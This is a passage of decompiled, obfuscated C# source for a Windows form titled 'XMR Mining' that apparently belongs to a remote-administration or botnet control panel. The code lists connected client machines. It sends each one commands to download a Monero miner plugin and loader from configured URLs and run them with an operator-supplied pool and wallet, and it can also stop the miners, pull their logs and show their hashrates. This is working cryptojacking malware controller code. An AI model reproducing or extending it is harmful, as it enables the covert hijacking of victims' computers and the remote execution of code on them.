        this.vmethod_112().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_112().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_112().Border.HoverVisible = true;
        this.vmethod_112().Border.Rounding = 6;
        this.vmethod_112().Border.Thickness = 1;
        this.vmethod_112().Border.Type = ShapeTypes.Rounded;
        this.vmethod_112().Border.Visible = true;
        this.vmethod_112().DialogResult = DialogResult.None;
        this.vmethod_112().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_112().Image = null;
        this.vmethod_112().Location = new Point(8, 0x1ad);
        this.vmethod_112().MouseState = MouseStates.Normal;
        this.vmethod_112().Name = "btnStart";
        this.vmethod_112().Size = new Size(0x3d, 30);
        this.vmethod_112().TabIndex = 0x5e;
        this.vmethod_112().Text = "Start";
        this.vmethod_112().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_112().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_112().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_112().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_112().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_112().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_112().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_112().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_114().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_114().Image = Class131.smethod_24();
        this.vmethod_114().Location = new Point(580, 450);
        this.vmethod_114().Margin = new Padding(2);
        this.vmethod_114().Name = "pbXMRThreads";
        this.vmethod_114().Size = new Size(15, 15);
        this.vmethod_114().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_114().TabIndex = 0x60;
        this.vmethod_114().TabStop = false;
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        base.ClientSize = new Size(0x42e, 0x1fb);
        base.Controls.Add(this.vmethod_114());
        base.Controls.Add(this.vmethod_110());
        base.Controls.Add(this.vmethod_112());
        base.Controls.Add(this.vmethod_106());
        base.Controls.Add(this.vmethod_104());
        base.Controls.Add(this.vmethod_72());
        base.Controls.Add(this.vmethod_74());
        base.Controls.Add(this.vmethod_70());
        base.Controls.Add(this.vmethod_66());
        base.Controls.Add(this.vmethod_68());
        base.Controls.Add(this.vmethod_62());
        base.Controls.Add(this.vmethod_64());
        base.Controls.Add(this.vmethod_60());
        base.Controls.Add(this.vmethod_56());
        base.Controls.Add(this.vmethod_58());
        base.Controls.Add(this.vmethod_52());
        base.Controls.Add(this.vmethod_54());
        base.Controls.Add(this.vmethod_50());
        base.Controls.Add(this.vmethod_44());
        base.Controls.Add(this.vmethod_46());
        base.Controls.Add(this.vmethod_42());
        base.Controls.Add(this.vmethod_40());
        base.Controls.Add(this.vmethod_36());
        base.Controls.Add(this.vmethod_38());
        base.Controls.Add(this.vmethod_34());
        base.Controls.Add(this.vmethod_32());
        base.Controls.Add(this.vmethod_30());
        base.Controls.Add(this.vmethod_28());
        base.Controls.Add(this.vmethod_0());
        base.Controls.Add(this.vmethod_22());
        this.DoubleBuffered = true;
        base.Margin = new Padding(2);
        base.Name = "fMinerXMR";
        base.Opacity = 0.0;
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        base.StartPosition = FormStartPosition.CenterParent;
        this.Text = "XMR Mining";
        this.vmethod_0().ResumeLayout(false);
        this.vmethod_0().PerformLayout();
        this.vmethod_22().EndInit();
        this.vmethod_78().ResumeLayout(false);
        ((ISupportInitialize) this.vmethod_106()).EndInit();
        ((ISupportInitialize) this.vmethod_114()).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }

    public void method_0(string string_0, string string_1)
    {
        if (this.vmethod_22().InvokeRequired)
        {
            object[] args = new object[] { string_0, string_1 };
            this.vmethod_22().Invoke(new Delegate83(this.method_0), args);
        }
        else if (!Class130.concurrentDictionary_4.ContainsKey(string_0))
        {
            if (Operators.CompareString(string_1, null, true) == 0)
            {
                string_1 = Class130.concurrentDictionary_3[string_0].sUser;
            }
            cMinerXMRcli rcli = new cMinerXMRcli();
            rcli.USER = string_1;
            rcli.Key = string_0;
            rcli.THREADS = "N/A";
            rcli.DONATE = "N/A";
            rcli.ALGO = "N/A";
            rcli.CPU = "N/A";
            rcli.POOL = "N/A";
            rcli.SHARES = "N/A";
            rcli.SPEED = "N/A";
            rcli.OPENCL = "N/A";
            rcli.DURATION = "N/A";
            rcli.bJustConnected = true;
            int num = Enumerable.Count<string>(rcli.idxValues) - 1;
            int index = 1;
            while (true)
            {
                if (index > num)
                {
                    Class130.concurrentDictionary_4.TryAdd(string_0, rcli);
                    Class130.concurrentDictionary_4[string_0].Key = string_0;
                    this.concurrentStack_0.Push(rcli);
                    break;
                }
                rcli.idxValues[index] = "N/A";
                index++;
            }
        }
    }

    public void method_1(string string_0, string[] string_1)
    {
        if (!Class130.concurrentDictionary_4.ContainsKey(string_0))
        {
            this.method_0(string_0, null);
            this.method_1(string_0, string_1);
        }
        else if (this.vmethod_22().InvokeRequired)
        {
            object[] args = new object[] { string_0, string_1 };
            this.vmethod_22().Invoke(new Delegate84(this.method_1), args);
        }
        else
        {
            Class130.concurrentDictionary_4[string_0].idxValues[1] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[0], string.Empty, true) == 0, "N/A", string_1[0]));
            Class130.concurrentDictionary_4[string_0].idxValues[2] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[1], string.Empty, true) == 0, "N/A", string_1[1]));
            Class130.concurrentDictionary_4[string_0].idxValues[3] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[2], string.Empty, true) == 0, "N/A", string_1[2]));
            Class130.concurrentDictionary_4[string_0].idxValues[4] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[3], string.Empty, true) == 0, "N/A", string_1[3]));
            Class130.concurrentDictionary_4[string_0].idxValues[5] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[4], string.Empty, true) == 0, "N/A", string_1[4]));
            Class130.concurrentDictionary_4[string_0].idxValues[6] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[5], string.Empty, true) == 0, "N/A", string_1[5]));
            Class130.concurrentDictionary_4[string_0].idxValues[7] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[6], string.Empty, true) == 0, "N/A", string_1[6]));
            Class130.concurrentDictionary_4[string_0].idxValues[8] = Conversions.ToString(Interaction.IIf((Operators.CompareString(string_1[7], string.Empty, true) == 0) | (Operators.CompareString(string_1[7], "n/a", true) == 0), "N/A", string_1[7] + " H/s"));
            Class130.concurrentDictionary_4[string_0].idxValues[9] = Conversions.ToString(Interaction.IIf(Operators.CompareString(string_1[8], string.Empty, true) == 0, "N/A", string_1[8]));
            Class130.concurrentDictionary_4[string_0].rejected = Conversions.ToBoolean(Interaction.IIf(string_1[5].Contains("("), true, false));
            Class130.concurrentDictionary_4[string_0].bJustConnected = false;
            this.concurrentStack_1.Push(Class130.concurrentDictionary_4[string_0]);
        }
    }

    private void method_10(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_66().Text, "(Optional)", true) == 0)
        {
            this.vmethod_66().Text = string.Empty;
            this.vmethod_66().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_66().Font, FontStyle.Regular);
            this.vmethod_66().Font = font;
        }
    }

    private void method_11(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_66().Text, string.Empty, true) == 0)
        {
            this.vmethod_66().Text = "(Optional)";
            this.vmethod_66().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_66().Font, FontStyle.Italic);
            this.vmethod_66().Font = font;
        }
    }

    private void method_12(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_72().Text, string.Empty, true) == 0)
        {
            this.vmethod_72().Text = "(Optional)";
            this.vmethod_72().ForeColor = Color.Gray;
            Font font = new Font(this.vmethod_72().Font, FontStyle.Italic);
            this.vmethod_72().Font = font;
        }
    }

    private void method_13(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.vmethod_72().Text, "(Optional)", true) == 0)
        {
            this.vmethod_72().Text = string.Empty;
            this.vmethod_72().ForeColor = Color.Black;
            Font font = new Font(this.vmethod_72().Font, FontStyle.Regular);
            this.vmethod_72().Font = font;
        }
    }

    private void method_14(object sender, EventArgs e)
    {
        this.method_15();
    }

    public void method_15()
    {
        if (Class130.fMinerXMRLogManager_0.vmethod_0().InvokeRequired)
        {
            Class130.fMinerXMRLogManager_0.vmethod_0().Invoke(new Delegate80(this.method_15), new object[0]);
        }
        else
        {
            Class130.fMinerXMRLogManager_0.Visible = true;
            Class130.fMinerXMRLogManager_0.Activate();
            bool flag = false;
            Form form2 = this;
            Form form = Class130.fMinerXMRLogManager_0;
            Rectangle rectangle = (form2 == null) ? Screen.FromPoint(form.Location).WorkingArea : form2.RectangleToScreen(form2.ClientRectangle);
            form.Location = new Point(rectangle.Left + ((rectangle.Width - form.Width) / 2), rectangle.Top + ((rectangle.Height - form.Height) / 2));
            if (flag)
            {
                form.Visible = true;
            }
            Class130.fMinerXMRLogManager_0.Opacity = 100.0;
        }
    }

    private void method_16(object sender, EventArgs e)
    {
        this.method_15();
        FastObjectListView view = this.vmethod_22();
        if (view.get_SelectedObjects() != null)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                string str = "xmr_mine_log|1";
                string key = ((cMinerXMRcli) enumerator.Current).Key;
                Class136.Class138 class2 = new Class136.Class138();
                class2.string_0 = key;
                class2.string_1 = str;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        view = null;
    }

    private void method_17(object sender, MouseEventArgs e)
    {
        this.vmethod_82().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_22().get_SelectedObjects().Count > 0, true, false));
        this.vmethod_92().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_22().get_SelectedObjects().Count > 0, true, false));
        this.vmethod_96().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_22().get_SelectedObjects().Count > 0, true, false));
    }

    private void method_18(object sender, EventArgs e)
    {
    }

    private void method_19(object sender, EventArgs e)
    {
        this.method_15();
    }

    public void method_2(string string_0)
    {
        if (Class130.concurrentDictionary_4.ContainsKey(string_0))
        {
            if (this.vmethod_22().InvokeRequired)
            {
                object[] args = new object[] { string_0 };
                this.vmethod_22().Invoke(new Delegate78(this.method_2), args);
            }
            else
            {
                this.concurrentStack_2.Push(Class130.concurrentDictionary_4[string_0]);
                Class130.concurrentDictionary_4.TryRemove(string_0, out (cMinerXMRcli) out null);
            }
        }
    }

    private void method_20(object sender, EventArgs e)
    {
        FastObjectListView view = this.vmethod_22();
        if (view.get_SelectedObjects() != null)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                string str = "xmr_mine_stop|1";
                string key = ((cMinerXMRcli) enumerator.Current).Key;
                Class136.Class138 class2 = new Class136.Class138();
                class2.string_0 = key;
                class2.string_1 = str;
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
        view = null;
    }

    private void method_21(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_22().get_Items().GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_22(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        FastObjectListView view = this.vmethod_22();
        if (view.get_SelectedObjects().Count > 0)
        {
            IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
            while (enumerator.MoveNext())
            {
                cMinerXMRcli current = (cMinerXMRcli) enumerator.Current;
                string[] textArray1 = new string[20];
                textArray1[0] = current.USER;
                textArray1[1] = "\t";
                textArray1[2] = current.THREADS;
                textArray1[3] = "\t";
                textArray1[4] = current.POOL;
                textArray1[5] = "\t";
                textArray1[6] = current.ALGO;
                textArray1[7] = "\t";
                textArray1[8] = current.OPENCL;
                textArray1[9] = "\t";
                textArray1[10] = current.CPU;
                textArray1[11] = "\t";
                textArray1[12] = current.SHARES;
                textArray1[13] = "\t";
                textArray1[14] = current.DONATE;
                textArray1[15] = "\t";
                textArray1[0x10] = current.SPEED;
                textArray1[0x11] = "\t";
                textArray1[0x12] = current.DURATION;
                textArray1[0x13] = "\r\n";
                builder.Append(string.Concat(textArray1));
            }
        }
        view = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_23(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        IEnumerator enumerator = this.vmethod_22().get_Objects().GetEnumerator();
        while (enumerator.MoveNext())
        {
            cMinerXMRcli current = (cMinerXMRcli) enumerator.Current;
            string[] textArray1 = new string[20];
            textArray1[0] = current.USER;
            textArray1[1] = "\t";
            textArray1[2] = current.THREADS;
            textArray1[3] = "\t";
            textArray1[4] = current.POOL;
            textArray1[5] = "\t";
            textArray1[6] = current.ALGO;
            textArray1[7] = "\t";
            textArray1[8] = current.OPENCL;
            textArray1[9] = "\t";
            textArray1[10] = current.CPU;
            textArray1[11] = "\t";
            textArray1[12] = current.SHARES;
            textArray1[13] = "\t";
            textArray1[14] = current.DONATE;
            textArray1[15] = "\t";
            textArray1[0x10] = current.SPEED;
            textArray1[0x11] = "\t";
            textArray1[0x12] = current.DURATION;
            textArray1[0x13] = "\r\n";
            builder.Append(string.Concat(textArray1));
        }
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_24(object sender, EventArgs e)
    {
        Interaction.MsgBox("If enabled, the 64-Bit version of the XMR miner will be used, which offers a much higher hashrate.\r\n\r\nNote: This plugin is only supported on 64-Bit editions of Windows.", MsgBoxStyle.Information, Application.ProductName);
    }

    public void method_25()
    {
        if (this.vmethod_22().InvokeRequired)
        {
            this.vmethod_22().Invoke(new Delegate81(this.method_25), new object[0]);
        }
        else if (this.concurrentStack_0.Count > 0)
        {
            this.vmethod_22().AddObjects(Enumerable.ToList<cMinerXMRcli>(this.concurrentStack_0));
            this.concurrentStack_0.Clear();
        }
    }

    public void method_26()
    {
        if (this.vmethod_22().InvokeRequired)
        {
            this.vmethod_22().Invoke(new Delegate82(this.method_26), new object[0]);
        }
        else if (this.concurrentStack_1.Count > 0)
        {
            this.vmethod_22().RefreshObjects(Enumerable.ToList<cMinerXMRcli>(this.concurrentStack_1));
            this.concurrentStack_1.Clear();
        }
    }

    public void method_27()
    {
        if (this.vmethod_22().InvokeRequired)
        {
            this.vmethod_22().Invoke(new Delegate79(this.method_27), new object[0]);
        }
        else if (this.concurrentStack_2.Count > 0)
        {
            this.vmethod_22().RemoveObjects(Enumerable.ToList<cMinerXMRcli>(this.concurrentStack_2));
            this.concurrentStack_2.Clear();
        }
    }

    private void method_28(object sender, DoWorkEventArgs e)
    {
        while (true)
        {
            this.method_25();
            this.method_26();
            this.method_27();
            Thread.Sleep(0x3e8);
        }
    }

    private void method_29(object sender, EventArgs e)
    {
        string str = string.Empty;
        string str2 = string.Empty;
        string str3 = string.Empty;
        string str4 = string.Empty;
        string str5 = string.Empty;
        string str6 = string.Empty;
        string str7 = string.Empty;
        string str8 = string.Empty;
        string str9 = string.Empty;
        object obj2 = Interaction.IIf(this.vmethod_104().Checked, Application.StartupPath + @"\data\plugins\xmr64.plg", Application.StartupPath + @"\data\plugins\xmr.plg");
        if (!File.Exists(Conversions.ToString(obj2)))
        {
            Interaction.MsgBox(Operators.ConcatenateObject(Operators.ConcatenateObject("Plugin not found! Please make sure: ", obj2), " exists."), MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else if (!Class135.smethod_0().PluginsUpload && (((((Class135.smethod_0().PluginsURLXMR.Length < 8) | !Class135.smethod_0().PluginsURLXMR.Contains("://")) | !Class135.smethod_0().PluginsURLXMR.Contains("http")) | !Class135.smethod_0().PluginsURLXMR.Contains(".")) | (Operators.CompareString(Class135.smethod_0().PluginsURLXMR, "URL to plugin: http://site.com/xmr.plg", true) == 0)))
        {
            Interaction.MsgBox("URL to XMR Miner plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
            Class130.fSettings_0.Visible = true;
            Class130.fSettings_0.Activate();
            Class130.fSettings_0.vmethod_6().SelectedIndex = 2;
            Class130.fSettings_0.vmethod_42().Select();
            Class130.fSettings_0.vmethod_42().BackColor = Color.Red;
        }
        else if (((this.vmethod_34().Text.Length < 5) | !this.vmethod_34().Text.Contains(":")) | (Operators.CompareString(this.vmethod_34().Text, "example-pool.com:5555", true) == 0))
        {
            Interaction.MsgBox("Invalid Pool/URL of mining server!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else if ((this.vmethod_36().Text.Length < 1) | (Operators.CompareString(this.vmethod_36().Text, "Username/wallet address", true) == 0))
        {
            Interaction.MsgBox("Invalid Username!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            string str10;
            string sKey;
            Class136.Class138 class2;
            if (this.vmethod_44().SelectedIndex > 0)
            {
                str = " --threads " + this.vmethod_44().SelectedItem.ToString();
            }
            if (this.vmethod_56().SelectedIndex > 0)
            {
                str8 = " --donate-level=" + this.vmethod_56().SelectedItem.ToString();
            }
            if ((this.vmethod_52().Text.Length > 0) & (Operators.CompareString(this.vmethod_52().Text, "(Optional)", true) != 0))
            {
                str3 = " -u " + this.vmethod_52().Text;
            }
            if ((this.vmethod_66().Text.Length > 0) & (Operators.CompareString(this.vmethod_66().Text, "(Optional)", true) != 0))
            {
                str9 = " --user-agent \"" + this.vmethod_66().Text + "\"";
            }
            if ((this.vmethod_72().Text.Length > 0) & (Operators.CompareString(this.vmethod_72().Text, "(Optional)", true) != 0))
            {
                string text = this.vmethod_72().Text;
            }
            if (this.vmethod_50().Checked)
            {
                str4 = " --nicehash";
            }
            if (this.vmethod_60().Checked)
            {
                str5 = " --keepalive";
            }
            if (this.vmethod_70().Checked)
            {
                str6 = " --no-huge-pages";
            }
            str7 = " -u " + this.vmethod_36().Text;
            str2 = " -a " + this.vmethod_42().SelectedItem.ToString();
            if (this.vmethod_62().SelectedIndex != 3)
            {
                switch (this.vmethod_62().SelectedIndex)
                {
                    default:
                        break;
                }
            }
            StringBuilder builder = new StringBuilder();
            byte[] buffer = MD5.Create().ComputeHash(File.ReadAllBytes(Conversions.ToString(obj2)));
            int num2 = buffer.Length - 1;
            for (int i = 0; i <= num2; i++)
            {
                builder.Append(buffer[i].ToString("X2"));
            }
            StringBuilder builder2 = new StringBuilder();
            if (this.vmethod_104().Checked)
            {
                byte[] buffer2 = MD5.Create().ComputeHash(File.ReadAllBytes(Application.StartupPath + @"\data\plugins\loader.plg"));
                int num4 = buffer2.Length - 1;
                for (int j = 0; j <= num4; j++)
                {
                    builder2.Append(buffer2[j].ToString("X2"));
                }
            }
            FastObjectListView view = Class130.fMain_0.vmethod_18();
            if (!this.vmethod_30().Checked)
            {
                if (!Class135.smethod_0().PluginsUpload)
                {
                    if (!this.vmethod_104().Checked)
                    {
                        IEnumerator enumerator = view.get_Objects().GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            CClient current = (CClient) enumerator.Current;
                            string[] textArray6 = new string[15];
                            textArray6[0] = builder.ToString().ToLower();
                            textArray6[1] = "|";
                            textArray6[2] = Class135.smethod_0().PluginsURLXMR;
                            textArray6[3] = "|";
                            textArray6[4] = str;
                            textArray6[5] = str2;
                            textArray6[6] = " -o ";
                            textArray6[7] = this.vmethod_34().Text;
                            textArray6[8] = str7;
                            textArray6[9] = str3;
                            textArray6[10] = str4;
                            textArray6[11] = str5;
                            textArray6[12] = str6;
                            textArray6[13] = str8;
                            textArray6[14] = str9;
                            current.MINER_LAST_SETTINGS = string.Concat(textArray6);
                            str10 = "xmr_mine_start|" + current.MINER_LAST_SETTINGS;
                            sKey = current.sKey;
                            class2 = new Class136.Class138();
                            class2.string_0 = sKey;
                            class2.string_1 = str10;
                            class2.long_0 = 0L;
                            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                            {
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                        }
                    }
                    else
                    {
                        IEnumerator enumerator = view.get_Objects().GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            CClient current = (CClient) enumerator.Current;
                            string[] textArray5 = new string[0x13];
                            textArray5[0] = builder.ToString().ToLower();
                            textArray5[1] = "|";
                            textArray5[2] = Class135.smethod_0().PluginsURLXMR64;
                            textArray5[3] = "|";
                            textArray5[4] = builder2.ToString().ToLower();
                            textArray5[5] = "|";
                            textArray5[6] = Class135.smethod_0().PluginsURLLoader;
                            textArray5[7] = "|";
                            textArray5[8] = str;
                            textArray5[9] = str2;
                            textArray5[10] = " -o ";
                            textArray5[11] = this.vmethod_34().Text;
                            textArray5[12] = str7;
                            textArray5[13] = str3;
                            textArray5[14] = str4;
                            textArray5[15] = str5;
                            textArray5[0x10] = str6;
                            textArray5[0x11] = str8;
                            textArray5[0x12] = str9;
                            current.MINER_LAST_SETTINGS = string.Concat(textArray5);
                            str10 = "xmr64_mine_start|" + current.MINER_LAST_SETTINGS;
                            sKey = current.sKey;
                            class2 = new Class136.Class138();
                            class2.string_0 = sKey;
                            class2.string_1 = str10;
                            class2.long_0 = 0L;
                            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                            {
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                        }
                    }
                }
                else if (!this.vmethod_104().Checked)
                {
                    IEnumerator enumerator = view.get_Objects().GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        CClient current = (CClient) enumerator.Current;
                        string[] textArray8 = new string[15];
                        textArray8[0] = builder.ToString().ToLower();
                        textArray8[1] = "|";
                        textArray8[2] = Class135.smethod_0().PluginsURLXMR;
                        textArray8[3] = "|";
                        textArray8[4] = str;
                        textArray8[5] = str2;
                        textArray8[6] = " -o ";
                        textArray8[7] = this.vmethod_34().Text;
                        textArray8[8] = str7;
                        textArray8[9] = str3;
                        textArray8[10] = str4;
                        textArray8[11] = str5;
                        textArray8[12] = str6;
                        textArray8[13] = str8;
                        textArray8[14] = str9;
                        current.MINER_LAST_SETTINGS = string.Concat(textArray8);
                        str10 = "xmr_mine_req|" + builder.ToString().ToLower();
                        sKey = current.sKey;
                        class2 = new Class136.Class138();
                        class2.string_0 = sKey;
                        class2.string_1 = str10;
                        class2.long_0 = 0L;
                        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                        {
                            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                        }
                    }
                }
                else
                {
                    IEnumerator enumerator = view.get_Objects().GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        CClient current = (CClient) enumerator.Current;
                        string[] textArray7 = new string[0x13];
                        textArray7[0] = builder.ToString().ToLower();
                        textArray7[1] = "|";
                        textArray7[2] = Class135.smethod_0().PluginsURLXMR64;
                        textArray7[3] = "|";
                        textArray7[4] = builder2.ToString().ToLower();
                        textArray7[5] = "|";
                        textArray7[6] = Class135.smethod_0().PluginsURLLoader;
                        textArray7[7] = "|";
                        textArray7[8] = str;
                        textArray7[9] = str2;
                        textArray7[10] = " -o ";
                        textArray7[11] = this.vmethod_34().Text;
                        textArray7[12] = str7;
                        textArray7[13] = str3;
                        textArray7[14] = str4;
                        textArray7[15] = str5;
                        textArray7[0x10] = str6;
                        textArray7[0x11] = str8;
                        textArray7[0x12] = str9;
                        current.MINER_LAST_SETTINGS = string.Concat(textArray7);
                        str10 = "xmr64_mine_req|" + builder.ToString().ToLower() + "|" + builder2.ToString().ToLower();
                        sKey = current.sKey;
                        class2 = new Class136.Class138();
                        class2.string_0 = sKey;
                        class2.string_1 = str10;
                        class2.long_0 = 0L;
                        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                        {
                            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                        }
                    }
                }
            }
            else if (view.get_SelectedObjects() != null)
            {
                if (!Class135.smethod_0().PluginsUpload)
                {
                    if (!this.vmethod_104().Checked)
                    {
                        IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            CClient current = (CClient) enumerator.Current;
                            string[] textArray2 = new string[15];
                            textArray2[0] = builder.ToString().ToLower();
                            textArray2[1] = "|";
                            textArray2[2] = Class135.smethod_0().PluginsURLXMR;
                            textArray2[3] = "|";
                            textArray2[4] = str;
                            textArray2[5] = str2;
                            textArray2[6] = " -o ";
                            textArray2[7] = this.vmethod_34().Text;
                            textArray2[8] = str7;
                            textArray2[9] = str3;
                            textArray2[10] = str4;
                            textArray2[11] = str5;
                            textArray2[12] = str6;
                            textArray2[13] = str8;
                            textArray2[14] = str9;
                            current.MINER_LAST_SETTINGS = string.Concat(textArray2);
                            str10 = "xmr_mine_start|" + current.MINER_LAST_SETTINGS;
                            sKey = current.sKey;
                            class2 = new Class136.Class138();
                            class2.string_0 = sKey;
                            class2.string_1 = str10;
                            class2.long_0 = 0L;
                            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                            {
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                        }
                    }
                    else
                    {
                        IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
                        while (enumerator.MoveNext())
                        {
                            CClient current = (CClient) enumerator.Current;
                            string[] textArray1 = new string[0x13];
                            textArray1[0] = builder.ToString().ToLower();
                            textArray1[1] = "|";
                            textArray1[2] = Class135.smethod_0().PluginsURLXMR64;
                            textArray1[3] = "|";
                            textArray1[4] = builder2.ToString().ToLower();
                            textArray1[5] = "|";
                            textArray1[6] = Class135.smethod_0().PluginsURLLoader;
                            textArray1[7] = "|";
                            textArray1[8] = str;
                            textArray1[9] = str2;
                            textArray1[10] = " -o ";
                            textArray1[11] = this.vmethod_34().Text;
                            textArray1[12] = str7;
                            textArray1[13] = str3;
                            textArray1[14] = str4;
                            textArray1[15] = str5;
                            textArray1[0x10] = str6;
                            textArray1[0x11] = str8;
                            textArray1[0x12] = str9;
                            current.MINER_LAST_SETTINGS = string.Concat(textArray1);
                            str10 = "xmr64_mine_start|" + current.MINER_LAST_SETTINGS;
                            sKey = current.sKey;
                            class2 = new Class136.Class138();
                            class2.string_0 = sKey;
                            class2.string_1 = str10;
                            class2.long_0 = 0L;
                            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                            {
                                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                            }
                        }
                    }
                }
                else if (!this.vmethod_104().Checked)
                {
                    IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        CClient current = (CClient) enumerator.Current;
                        string[] textArray4 = new string[15];
                        textArray4[0] = builder.ToString().ToLower();
                        textArray4[1] = "|";
                        textArray4[2] = Class135.smethod_0().PluginsURLXMR;
                        textArray4[3] = "|";
                        textArray4[4] = str;
                        textArray4[5] = str2;
                        textArray4[6] = " -o ";
                        textArray4[7] = this.vmethod_34().Text;
                        textArray4[8] = str7;
                        textArray4[9] = str3;
                        textArray4[10] = str4;
                        textArray4[11] = str5;
                        textArray4[12] = str6;
                        textArray4[13] = str8;
                        textArray4[14] = str9;
                        current.MINER_LAST_SETTINGS = string.Concat(textArray4);
                        str10 = "xmr_mine_req|" + builder.ToString().ToLower();
                        sKey = current.sKey;
                        class2 = new Class136.Class138();
                        class2.string_0 = sKey;
                        class2.string_1 = str10;
                        class2.long_0 = 0L;
                        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                        {
                            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                        }
                    }
                }
                else
                {
                    IEnumerator enumerator = view.get_SelectedObjects().GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        CClient current = (CClient) enumerator.Current;
                        string[] textArray3 = new string[0x13];
                        textArray3[0] = builder.ToString().ToLower();
                        textArray3[1] = "|";
                        textArray3[2] = Class135.smethod_0().PluginsURLXMR64;
                        textArray3[3] = "|";
                        textArray3[4] = builder2.ToString().ToLower();
                        textArray3[5] = "|";
                        textArray3[6] = Class135.smethod_0().PluginsURLLoader;
                        textArray3[7] = "|";
                        textArray3[8] = str;
                        textArray3[9] = str2;
                        textArray3[10] = " -o ";
                        textArray3[11] = this.vmethod_34().Text;
                        textArray3[12] = str7;
                        textArray3[13] = str3;
                        textArray3[14] = str4;
                        textArray3[15] = str5;
                        textArray3[0x10] = str6;
                        textArray3[0x11] = str8;
                        textArray3[0x12] = str9;
                        current.MINER_LAST_SETTINGS = string.Concat(textArray3);
                        str10 = "xmr64_mine_req|" + builder.ToString().ToLower() + "|" + builder2.ToString().ToLower();
                        sKey = current.sKey;
                        class2 = new Class136.Class138();
                        class2.string_0 = sKey;
                        class2.string_1 = str10;
                        class2.long_0 = 0L;
                        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                        {
                            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                        }
                    }
                }
            }
            view = null;
        }
    }

    private void method_3(object sender, EventArgs e)
    {
        double num = 0.0;
        double num2 = 0.0;
        long num3 = 0L;
        IEnumerator enumerator = this.vmethod_22().get_Objects().GetEnumerator();
